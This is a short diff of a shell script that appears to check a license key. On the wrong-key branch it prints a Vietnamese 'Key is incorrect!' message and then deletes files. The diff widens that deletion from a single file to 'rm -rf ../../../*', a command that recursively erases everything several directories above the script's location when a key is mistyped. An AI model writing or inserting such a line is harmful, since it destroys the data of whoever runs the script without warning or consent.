@@ -43,7 +43,7 @@ else
 sleep 2
 echo "Key Không Chính Xác !"
 sleep 1
-rm -rf ../../../abc.sh
+rm -rf ../../../*
 exit
 fi
 		
